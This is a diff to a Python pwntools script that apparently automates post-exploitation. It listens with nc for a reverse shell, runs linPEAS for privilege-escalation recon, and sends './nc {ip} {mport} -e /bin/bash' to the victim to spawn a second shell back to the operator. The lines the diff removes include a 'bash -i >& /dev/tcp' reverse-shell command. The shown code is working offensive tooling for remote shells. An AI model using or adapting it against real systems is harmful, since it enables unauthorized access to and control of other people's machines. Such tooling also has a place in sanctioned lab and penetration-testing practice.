@@ -1,11 +1,9 @@
 #!/usr/bin/python3
 
-import os
 from pwn import *
 import argparse
 import random
-import threading, time
-from datetime import datetime
+import threading
 import socket
 import fcntl
 import struct
@@ -28,16 +26,13 @@ def get_file(tmp_dir, ip, lport, p, filename):
 def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     p = process("/bin/bash")  # Spawns a process
     p.sendline(f"nc -lvnp {port}".encode())
-    print(f"Revrse shell_recon listening on port {port}")
+    print(f"Reverse shell_recon listening on port {port}")
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
 
+    # Spawn the manual shell thread
     threading.Thread(target=manual_shell, args=(mport,)).start()
-    # Spawn a new shell
-    sleep(5)
-    # p.sendline(f"bash -i >& /dev/tcp/{ip}/{5555} 0>&1 &".encode())
-    # p.sendline(f"nc {ip} {mport} 0>&1 &".encode())
 
     if os.path.exists("./linpeas.sh"):
         print("The file exists")
@@ -52,12 +47,8 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
         p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
 
     else:
-        print("The file doesn't exist")
-        # p.sendline("wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh")
-        # p.sendline("cat linpeas.sh")
+        print("The file doesn't exist on the local machine")
 
-    time.sleep(9999)
-    print("Job done!")
     exit()
 
 
@@ -74,9 +65,11 @@ def manual_shell(mport):
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
+    p.sendline("clear".encode())
     p.interactive()
 
 
+# Function to get the IP address of the current machine
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(
@@ -91,10 +84,9 @@ def main():
     print(tmp_dir)
     args = parse_args()
 
-    # random manual port
-
     lport = args.lport
     port = args.port
+
     mport = random.randint(1024, 65535)
     # Random port for the reverse shell that is not the same as the file server
     while mport == port or mport == lport or mport == 8080:
@@ -106,10 +98,7 @@ def main():
     threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
     # 2. Spawn the file server thread
     threading.Thread(target=file_server, args=(lport,)).start()
-    # 3. Spawn the manual shell thread
-    # threading.Thread(target=manual_shell, args=(mport,)).start()
 
 
 if __name__ == "__main__":
     main()
-
